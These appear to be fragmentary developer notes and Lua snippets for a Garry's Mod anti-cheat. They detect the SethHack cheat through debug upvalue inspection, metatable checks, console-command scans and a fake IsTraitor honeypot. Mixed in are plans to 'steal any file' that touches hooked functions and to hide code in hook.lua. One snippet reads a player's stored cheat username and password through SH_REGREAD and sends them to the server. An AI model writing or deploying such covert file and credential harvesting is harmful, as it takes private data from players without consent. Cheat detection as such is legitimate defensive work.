
steal any file that calls detour'd functions, make detour class

detour GetCurrentCommand, check path

hide stuff in hook.lua, add globals, rewrite fixenum to use multiple, 

use birdcage_browse to send init chest

ac_ob1.lua

===
use VON not glon
===

/coldfire *.txt


sh convar dump, pastebins
gcinfo

detour table.Copy, check call path, is hemi, copy module funcs

local DG1 = debug.getupvalue(debug.getupvalue,1)
if DG1 then
	local DG2 = debug.getupvalue( debug.getupvalue(debug.getupvalue,1), 1)






(usermessage.__metatable != nil)
(_G.__metatable != nil)
(_G.__index != nil)
(g_LocalPlayer != nil)
(GAMEMODE.AchievementThink != nil)
(debug.getupvalue(_R.Player.ConCommand) != nil)
(debug.getupvalue(file.ExistsEx) != nil)

sv_allow_voice_from_file == 1

local Tab = concommand.GetTable()
for cmd,func in pairs(Tab) do
	if cmd:find("shenable") then
		--BAN
	end
end


local _, g = debug.getupvalue( debug.getmetatable( _G ).__index, 1 )

if g and g.SH_REGREAD then
local user = SH_REGREAD( "username" )
local pass = SH_REGREAD( "password" )
runCommand( ourAuthCmd, "agdsd", user, pass )
end







local i = 1;
local up,val = debug.getupvalue( hook.Call, i );
local t = {};
while ( up != nil ) do
    t[up] = val;
    i = i + 1;
    up, val = debug.getupvalue( hook.Call, i );
end
 
if t["SH"] then
    MsgN( "hey look you have sethhack" );
end






function _R.Player.IsTraitor()
	return true
end

function _R.Player.IsPlayer()
	return false
end





